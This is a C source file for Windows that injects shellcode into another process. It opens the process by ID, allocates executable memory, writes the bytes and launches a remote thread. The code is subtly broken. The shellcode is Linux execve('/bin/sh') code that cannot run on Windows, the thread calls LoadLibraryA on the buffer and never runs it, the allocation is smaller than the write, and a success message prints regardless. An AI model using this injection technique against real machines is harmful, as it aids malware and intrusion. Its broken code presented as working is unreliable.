#include <windows.h>
#include <stdio.h>

int main()
{
    DWORD pid = 1234; // Replace with target process ID
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL)
    {
        printf("Could not open process %d, error code %d\n", pid, GetLastError());
        return 1;
    }

    // Allocate memory in the target process for the shellcode
    LPVOID lpShellcode = VirtualAllocEx(hProcess, NULL, sizeof(char) * 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpShellcode == NULL)
    {
        printf("Could not allocate memory in process %d, error code %d\n", pid, GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Write the shellcode to the allocated memory
    char buf[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
    if (!WriteProcessMemory(hProcess, lpShellcode, buf, sizeof(buf), NULL))
    {
        printf("Could not write shellcode to process %d, error code %d\n", pid, GetLastError());
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of the LoadLibraryA function in kernel32.dll
    HMODULE hModule = GetModuleHandleA("kernel32.dll");
    if (hModule == NULL)
    {
        printf("Could not get handle to kernel32.dll, error code %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    LPVOID lpLoadLibraryA = (LPVOID)GetProcAddress(hModule, "LoadLibraryA");
    if (lpLoadLibraryA == NULL)
    {
        printf("Could not get address of LoadLibraryA function, error code %d\n", GetLastError());
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpLoadLibraryA, lpShellcode, 0, NULL);
    if (hThread == NULL)
    {
        printf("Could not create remote thread in process %d, error code %d\n", pid, GetLastError());
        VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("Shellcode executed successfully in process %d\n", pid);

    // Clean up resources
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, lpShellcode, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
